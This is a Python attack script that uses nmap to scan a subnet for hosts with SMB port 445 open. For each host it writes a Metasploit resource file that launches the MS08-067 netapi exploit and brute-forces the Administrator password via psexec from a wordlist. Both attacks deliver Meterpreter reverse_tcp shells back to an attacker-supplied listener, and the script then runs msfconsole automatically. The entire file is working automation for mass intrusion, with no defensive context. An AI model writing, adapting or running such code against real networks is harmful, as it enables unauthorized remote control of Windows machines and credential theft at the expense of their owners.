import os
import argparse
import sys
import nmap

def findTgt(subNet):
    nmScan=nmap.PortScanner()
    nmScan.scan(subNet,'445') #445 default smb port
    tgtHost=[]
    for host in nmScan.all_hosts():
        state=nmScan[host]['tcp'][445]['state']
        if state =='open':
            print('[+] Found Target Host: '+host)
            tgtHost.append(host)
    return tgtHost

def setupHandler(configFile,lhost,lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload '+'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST '+lhost+'\n')
    configFile.write('set LPORT '+lport+'\n')
    configFile.write('exploit -j -z \n')
    configFile.write('setg DisablePayloadHandler 1\n')

def conficker(configFile,lhost,lport,tgthost):
    configFile.write('use exploit/windows/smb/ms08_067_netapi \n')
    configFile.write('set RHOST '+tgthost+'\n')
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST '+lhost+'\n')
    configFile.write('set LPORT '+lport+'\n')
    configFile.write('exploit -j -z\n')

def smbBrute(configFile,tgthost,lhost,lport,passwd):
    username='Administrator'
    pF=open(passwd,'r')
    for password in pF.readlines():
        password=password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser '+str(username)+'\n')
        configFile.write('set SMBpass '+str(password)+'\n')
        configFile.write('set RHOST '+str(tgthost)+'\n')
        configFile.write('set payload windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT '+lport+'\n')
        configFile.write('set LHOST '+lhost+'\n')
        configFile.write('exploit -j -z \n')

def main():
    configFile=open('meta.rc','w')
    parser=argparse.ArgumentParser(epilog='Usage: python '+sys.argv[0]+' -H <RHOST> -l<LHOTS> -lp<LPORT> -P <Password File>')
    parser._optionals.title='OPTIONS'
    parser.add_argument('-H',dest='tgtHost',help='Specify the target address[es]',required=True)
    parser.add_argument('-l',dest='lhost',help='Specify the listen address',required=True)
    parser.add_argument('-lp',dest='lport',default='1337',help='Specify the listen port')
    parser.add_argument('-P',dest='password',help='Specify the password File',required=True)
    args=parser.parse_args()

    lhost=args.lhost
    lport=args.lport
    passwd=args.password
    tgtHost=findTgt(args.tgtHost)
    
    if len(tgtHost) !=0:
        setupHandler(configFile,lhost,lport)
        for host in tgtHost:
            print('1')
            conficker(configFile,lhost,lport,host)
            if passwd != None:
                smbBrute(configFile,host,lhost,lport,passwd)
        configFile.close()
        os.system('msfconsole -r meta.rc')
    else:
        print('[-] Port closed on target')



if __name__=="__main__":
    main()